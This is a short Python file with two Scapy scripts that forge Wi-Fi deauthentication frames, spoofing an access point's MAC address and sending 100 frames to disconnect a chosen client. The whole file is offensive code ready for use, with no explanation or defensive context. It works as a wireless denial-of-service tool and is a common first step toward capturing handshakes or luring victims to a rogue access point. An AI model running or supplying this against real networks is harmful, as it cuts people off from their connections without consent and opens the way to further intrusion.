#!/usr/bin/env python3
from scapy.all import RadioTap,Dot11,Dot11Deauth,send
target_mac = "08:00:27:95:bd:54"
ap_mac = "11:22:33:44:55:66"
packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
send(packet, count=100, inter=0.1)


from scapy.all import *
 
ap_mac = "11:22:33:44:55:66"  # MAC address of access point to target
client_mac = "aa:bb:cc:dd:ee:ff"  # MAC address of client to target
 
pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
sendp(pkt, iface="wlan0mon", count=100)
